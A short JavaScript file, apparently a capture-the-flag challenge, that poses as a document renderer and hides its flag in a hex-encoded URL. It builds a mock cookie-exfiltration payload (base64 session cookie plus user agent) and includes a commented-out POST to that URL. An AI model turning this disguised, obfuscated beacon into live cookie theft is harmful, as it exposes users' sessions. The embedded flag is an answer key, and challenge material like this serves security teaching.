(function(){
  console.log("Preparing document rendering engine...");
  console.log("Fetching exam paper preview...");

  setTimeout(function(){

    // Simulated flag in hex
    const hexParts = (function() {
      const h = [
        "0x53", "0x65", "0x63", "0x75", "0x72", "0x69", "0x6E", "0x65",
        "0x74", "0x73", "0x7B", "0x37", "0x68", "0x31", "0x73", "0x5F",
        "0x64", "0x30", "0x33", "0x73", "0x6E", "0x27", "0x74", "0x5F",
        "0x6C", "0x30", "0x30", "0x6B", "0x5F", "0x6C", "0x31", "0x6B",
        "0x33", "0x5F", "0x33", "0x78", "0x34", "0x6D", "0x35", "0x5F",
        "0x74", "0x30", "0x5F", "0x6D", "0x33", "0x7D"
      ];
      return h.map(c => parseInt(c));
    })();

    const fullPath = [
      104, 116, 116, 112, 115, 58, 47, 47, // "https://"
      ...hexParts
    ];

    const u = String.fromCharCode(...fullPath);

    // Simulated but harmless "cookie" capture
    const doc_cookie = "sessionid=exam2025; theme=dark; access=true"; // harmless mock cookie
    const userAgentInfo = navigator.userAgent;

    // Fake payload
    const payload = {
      id: Math.random().toString(36).substring(2),
      data: btoa(doc_cookie),
      agent: userAgentInfo
    };

    // Fake "sending" behavior
    console.log("[DEBUG] Would send POST to:", u);
    console.log("[DEBUG] Payload:", JSON.stringify(payload, null, 2));

    // fetch(u, {
    //   method: "POST",
    //   headers: {
    //     "Content-Type": "application/json"
    //   },
    //   body: JSON.stringify(payload)
    // });

  }, 3000);
})();

